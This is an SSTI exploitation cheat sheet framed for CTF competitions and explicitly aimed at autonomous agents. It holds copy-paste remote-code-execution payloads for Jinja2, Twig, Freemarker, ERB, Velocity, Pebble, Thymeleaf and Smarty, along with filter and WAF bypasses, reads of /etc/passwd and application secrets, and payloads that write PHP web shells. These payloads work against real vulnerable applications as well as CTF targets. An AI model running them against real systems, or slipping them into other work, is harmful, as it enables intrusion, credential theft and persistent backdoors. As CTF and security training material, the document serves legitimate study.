# Server-Side Template Injection (SSTI) - CTF Exploitation Reference

> **Document Purpose:** Actionable SSTI techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, template engine identification, and RCE exploitation.

> **Critical:** SSTI is extremely common in CTF competitions and often leads to Remote Code Execution (RCE).

---

## 1. QUICK REFERENCE: SSTI Detection Payloads

> **When to use this section:** You suspect user input is being processed by a server-side template engine.

### 1.1 Universal SSTI Detection Probes

**Tags:** `ssti, detection, probe, testing, template, injection`

**Primary Detection Payloads (Try First):**
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
${{7*7}}
```

**Expected Results If Vulnerable:**
- `{{7*7}}` → Returns `49` = Template engine evaluated expression
- `${7*7}` → Returns `49` = Expression Language (EL) or Freemarker
- `<%= 7*7 %>` → Returns `49` = ERB (Ruby) or similar

**String-Based Detection:**
```
{{''.__class__}}
${class.getClass()}
<%= self.class %>
{{config}}
${T(java.lang.System).getenv()}
```

**Error-Inducing Probes:**
```
{{foobar}}
${foobar}
<%= foobar %>
#{foobar}
```
These may trigger template errors revealing the engine type.

**Agent Takeaway:**
- Start with `{{7*7}}` - most common syntax (Jinja2, Twig, etc.)
- If returns `49`, SSTI is confirmed
- If returns `{{7*7}}` literally, template engine not processing input or different syntax needed

---

### 1.2 Template Engine Identification

**Tags:** `ssti, identification, fingerprinting, template-engine`

**Identification Decision Tree:**
```
TEST: {{7*'7'}}
├── Returns 7777777 (string multiplication) → Jinja2/Twig
├── Returns 49 (numeric) → Twig
├── Error → Not Jinja2/Twig or blocked
└── Literal output → Try other syntaxes

TEST: ${7*7}
├── Returns 49 → Freemarker, Velocity, or Thymeleaf
├── Error with "java" → Java-based engine
└── Literal → Try other syntaxes

TEST: <%= 7*7 %>
├── Returns 49 → ERB (Ruby) or EJS (Node.js)
└── Error with "Ruby" → ERB confirmed

TEST: #{7*7}
├── Returns 49 → Pebble, Thymeleaf, or Ruby
└── Error → Check error message for hints

TEST: @(7*7)
├── Returns 49 → Razor (C#/.NET)
└── Other → Not Razor
```

**Quick Fingerprint Payloads:**

| Payload | Engine (if works) |
|---------|-------------------|
| `{{7*7}}` | Jinja2, Twig, Nunjucks, Django |
| `{{7*'7'}}` returns `7777777` | Jinja2 (Python) |
| `{{7*'7'}}` returns `49` | Twig (PHP) |
| `${7*7}` | Freemarker, Velocity, Thymeleaf |
| `<%= 7*7 %>` | ERB (Ruby), EJS (Node.js) |
| `#{7*7}` | Pebble, Slim, embedded Ruby |
| `${{7*7}}` | Thymeleaf (double syntax) |
| `@(7*7)` | Razor (.NET) |
| `{{= 7*7 }}` | doT.js |
| `[[${7*7}]]` | Thymeleaf (inlined) |

**Agent Takeaway:**
- Different engines use different syntax
- `{{7*'7'}}` differentiates Jinja2 (7777777) from Twig (49)
- Error messages often reveal engine type and framework

---

## 2. JINJA2 EXPLOITATION (Python)

> **When to use this section:** You've confirmed Jinja2 template engine (Flask, Django, or Python-based frameworks).

### 2.1 Jinja2 Characteristics

**Tags:** `ssti, jinja2, python, flask, characteristics`

**Identifying Features:**
- Common in Flask, Django (with Jinja), Bottle
- Syntax: `{{ }}` for expressions, `{% %}` for statements
- Python-based - access Python objects and methods
- Error messages mention "jinja2" or "TemplateSyntaxError"

**Basic Syntax:**
```jinja2
{{ expression }}           - Output expression value
{% statement %}            - Execute statement
{# comment #}              - Comment (not rendered)
{{ variable|filter }}      - Apply filter to variable
```

---

### 2.2 Jinja2 RCE Payloads (Copy-Paste Ready)

**Tags:** `ssti, jinja2, rce, payload, python, flask, command-execution`

**Classic Jinja2 RCE (Most Reliable):**
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

**Python 3 Jinja2 RCE Payloads:**

**Method 1: Using subprocess.Popen (Most Common):**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate() }}
```

**Method 2: Find os._wrap_close or subprocess:**
```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Method 3: Using request object (Flask):**
```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Method 4: Loop through subclasses to find Popen:**
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='Popen' %}{{ c('id',shell=True,stdout=-1).communicate() }}{% endif %}{% endfor %}
```

**Simpler RCE Payloads (Try These First):**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**Read Files:**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items() }}
{{ request.environ }}
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```

**List Directory:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').listdir('/') }}
{{ self.__init__.__globals__.__builtins__.__import__('os').listdir('.') }}
```

**Agent Takeaway:**
- Try `{{ config }}` first to confirm Jinja2 and see config
- Use `lipsum.__globals__['os'].popen('CMD').read()` for quick RCE
- Index numbers (like `[407]`) vary - may need to enumerate

---

### 2.3 Jinja2 Filter Bypass

**Tags:** `ssti, jinja2, bypass, filter, waf`

**If `_` (underscore) Blocked:**
```python
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
{{ ()|attr('\x5f\x5fclass\x5f\x5f') }}  # hex encoded underscores
{{ ''|attr('\137\137class\137\137') }}  # octal encoded
```

**If `.` (dot) Blocked:**
```python
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
{{ ''|attr('__class__')|attr('__mro__') }}
```

**If `[]` Blocked:**
```python
{{ ''.__class__.__mro__|first }}
{{ ''.__class__.__mro__.__getitem__(1) }}
```

**If Keywords Blocked (config, class, etc.):**
```python
{{ ''|attr('__cl'+'ass__') }}
{{ request|attr('application') }}
{% set x = '__cla' + 'ss__' %}{{ ''|attr(x) }}
```

**Using request.args for Bypass:**
```python
{{ ()|attr(request.args.get('a'))|attr(request.args.get('b'))... }}
# Then append ?a=__class__&b=__mro__ to URL
```

**Agent Takeaway:**
- `attr()` filter bypasses dot notation restrictions
- Hex/octal encoding bypasses underscore filters
- Use `request.args` to pass blocked keywords via URL params

---

### 2.4 Jinja2 Exploitation Playbook

**Tags:** `ssti, jinja2, playbook, workflow, step-by-step`

**Step 1: Confirm Jinja2**
```
Payload: {{7*7}}
Success: Returns 49
Payload: {{7*'7'}}
Success: Returns 7777777 (string * int = repeated string)
```

**Step 2: Leak Config (Quick Win)**
```
Payload: {{config}}
Payload: {{config.items()}}
Check for: SECRET_KEY, database credentials, flag
```

**Step 3: Attempt Quick RCE**
```
Payload: {{lipsum.__globals__['os'].popen('id').read()}}
Payload: {{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Step 4: If Quick RCE Fails, Enumerate Subclasses**
```
Payload: {{''.__class__.__mro__[1].__subclasses__()}}
Find: Popen, catch_warnings, or file-related classes
Note: Index number of useful class
```

**Step 5: Execute RCE**
```
Payload: {{''.__class__.__mro__[1].__subclasses__()[INDEX]('COMMAND',shell=True,stdout=-1).communicate()}}
```

**Step 6: Find Flag**
```
Commands to try:
- cat /flag
- cat /flag.txt
- ls -la /
- find / -name "*flag*"
- cat /etc/passwd (verify RCE works)
- env (environment variables)
```

**Agent Takeaway:**
- Always try `{{config}}` first for easy wins
- `lipsum.__globals__['os']` is the fastest path to RCE
- Subclass indices vary between Python versions

---

## 3. TWIG EXPLOITATION (PHP)

> **When to use this section:** You've confirmed Twig template engine (Symfony, Laravel with Twig, or PHP frameworks).

### 3.1 Twig Detection and Characteristics

**Tags:** `ssti, twig, php, detection, characteristics`

**Identifying Features:**
- Common in Symfony, Laravel (optionally), Craft CMS
- Syntax: `{{ }}` for output, `{% %}` for logic
- PHP-based
- `{{7*'7'}}` returns `49` (numeric, not string multiplication)

**Detection:**
```
{{7*7}} → 49
{{7*'7'}} → 49 (confirms Twig, not Jinja2)
{{_self}} → Object reference
```

---

### 3.2 Twig RCE Payloads

**Tags:** `ssti, twig, rce, payload, php, command-execution`

**Twig < 1.19 (Old Versions):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Twig 1.x RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

**Twig 2.x/3.x RCE (Using Filters):**
```php
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
{{['id']|map('system')}}
```

**File Read:**
```php
{{'/etc/passwd'|file_get_contents}}
{{"<?php phpinfo();?>"|file_put_contents("/var/www/shell.php")}}
```

**Information Disclosure:**
```php
{{_self}}
{{_self.env}}
{{app.request.server.all|join(',')}}
```

**Agent Takeaway:**
- `{{['id']|filter('system')}}` is the modern Twig RCE method
- Older Twig versions use `registerUndefinedFilterCallback`
- Check Twig version in errors if possible

---

## 4. FREEMARKER EXPLOITATION (Java)

> **When to use this section:** You've confirmed Freemarker template engine (Java Spring, Apache projects).

### 4.1 Freemarker Detection

**Tags:** `ssti, freemarker, java, detection`

**Detection Payloads:**
```
${7*7} → 49
<#assign x=7*7>${x} → 49
${.version} → Freemarker version
```

---

### 4.2 Freemarker RCE Payloads

**Tags:** `ssti, freemarker, rce, payload, java`

**Command Execution:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Alternative Methods:**
```java
${"freemarker.template.utility.Execute"?new()("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
```

**Read Files:**
```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()}
```

**Agent Takeaway:**
- `Execute?new()` is the classic Freemarker RCE gadget
- Java-based - can access Java classes and methods

---

## 5. OTHER TEMPLATE ENGINES

> **When to use this section:** Quick reference for less common template engines.

### 5.1 ERB (Ruby) Payloads

**Tags:** `ssti, erb, ruby, rce, payloads`

**Detection:**
```ruby
<%= 7*7 %>
<%= self.class %>
```

**RCE Payloads:**
```ruby
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').read %>
```

**Read Files:**
```ruby
<%= File.open('/etc/passwd').read %>
<%= File.read('/etc/passwd') %>
```

---

### 5.2 Velocity (Java) Payloads

**Tags:** `ssti, velocity, java, rce, payloads`

**Detection:**
```
$class
#set($x = 7 * 7)$x
```

**RCE:**
```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

---

### 5.3 Pebble (Java) Payloads

**Tags:** `ssti, pebble, java, rce, payloads`

**Detection:**
```
{{ 7*7 }}
```

**RCE:**
```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

---

### 5.4 Thymeleaf (Java/Spring) Payloads

**Tags:** `ssti, thymeleaf, java, spring, rce, payloads`

**Detection:**
```
${7*7}
[[${7*7}]]
```

**RCE:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

**Spring Expression Language (SpEL) via Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

---

### 5.5 Smarty (PHP) Payloads

**Tags:** `ssti, smarty, php, rce, payloads`

**Detection:**
```
{7*7}
{$smarty.version}
```

**RCE:**
```php
{system('id')}
{php}system('id');{/php}  (if php tags enabled)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

---

## 6. CTF-SPECIFIC SSTI STRATEGIES

> **When to use this section:** Solving SSTI challenges in CTF competitions.

### 6.1 SSTI Challenge Recognition

**Tags:** `ssti, ctf, recognition, patterns, hints`

**Challenge Title/Description Hints:**
- "Template", "render", "custom greeting"
- "Input your name", "personalized message"
- "Flask", "Jinja", "Twig", "Django"
- References to Python, PHP, or Java web frameworks

**Behavioral Hints:**
- Input is reflected with some processing
- Special characters cause errors
- Mathematical expressions are evaluated
- Dynamic content based on user input

---

### 6.2 SSTI CTF Playbook

**Tags:** `ssti, ctf, playbook, workflow, step-by-step`

**Step 1: Detect SSTI**
```
Test: {{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}
Success: Returns 49 instead of literal expression
```

**Step 2: Identify Engine**
```
Test: {{7*'7'}}
- 7777777 → Jinja2 (Python)
- 49 → Twig (PHP)
- Error → Other engine or blocked

Check error messages for hints
```

**Step 3: Try Quick Wins**
```
Jinja2: {{config}}, {{config.SECRET_KEY}}
Twig: {{_self.env}}
Freemarker: ${.version}
```

**Step 4: Achieve RCE**
```
Jinja2: {{lipsum.__globals__['os'].popen('id').read()}}
Twig: {{['id']|filter('system')}}
ERB: <%= `id` %>
```

**Step 5: Find Flag**
```
Common flag locations:
- /flag, /flag.txt
- ./flag, ./flag.txt
- /home/*/flag*
- Environment variables (env)
- Application config ({{config}})

Commands:
- cat /flag.txt
- find / -name "*flag*" 2>/dev/null
- env | grep -i flag
```

**Agent Takeaway:**
- Test multiple syntaxes quickly to identify engine
- Check config/secrets first for easy flags
- RCE is almost always the end goal for SSTI

---

### 6.3 SSTI Decision Tree

**Tags:** `ssti, decision-tree, workflow, identification`

```
START: Test {{7*7}}

IF: Returns 49
├── Test {{7*'7'}}
│   ├── Returns 7777777 → JINJA2 (Python/Flask)
│   │   └── Try: {{config}}, then {{lipsum.__globals__['os'].popen('id').read()}}
│   └── Returns 49 → TWIG (PHP)
│       └── Try: {{_self}}, then {{['id']|filter('system')}}
└── Returns {{7*7}} literally → Try other syntaxes

IF: Test ${7*7}
├── Returns 49 → Java engine (Freemarker/Velocity/Thymeleaf)
│   └── Try: ${7*7}, check error for specific engine
└── Returns literally → Try other syntaxes

IF: Test <%= 7*7 %>
├── Returns 49 → Ruby ERB or Node.js EJS
│   └── ERB: Try <%= system('id') %>
│   └── EJS: Check for Node.js environment
└── Returns literally → Not this engine

IF: All syntaxes return literally
└── SSTI may not exist, or custom engine/heavy filtering
```

**Agent Takeaway:**
- Follow decision tree for systematic identification
- Each engine has specific RCE gadgets
- Error messages are your friend for identification

---

## 7. SUMMARY: SSTI Quick Reference

**Detection Probes:**
```
{{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}
```

**Engine Identification:**
- `{{7*'7'}}` = 7777777 → Jinja2
- `{{7*'7'}}` = 49 → Twig
- `${...}` syntax → Java-based
- `<%= %>` syntax → Ruby/Node.js

**RCE Quick Reference:**

| Engine | RCE Payload |
|--------|-------------|
| Jinja2 | `{{lipsum.__globals__['os'].popen('id').read()}}` |
| Twig | `{{['id']\|filter('system')}}` |
| Freemarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| ERB | `<%= \`id\` %>` |
| Smarty | `{system('id')}` |

**Flag Hunting:**
```bash
cat /flag.txt
cat /flag
env | grep FLAG
find / -name "*flag*" 2>/dev/null
```

**Common Mistakes:**
- Wrong template syntax for engine
- Indices vary between versions (enumerate subclasses)
- Some characters may be filtered (try bypasses)
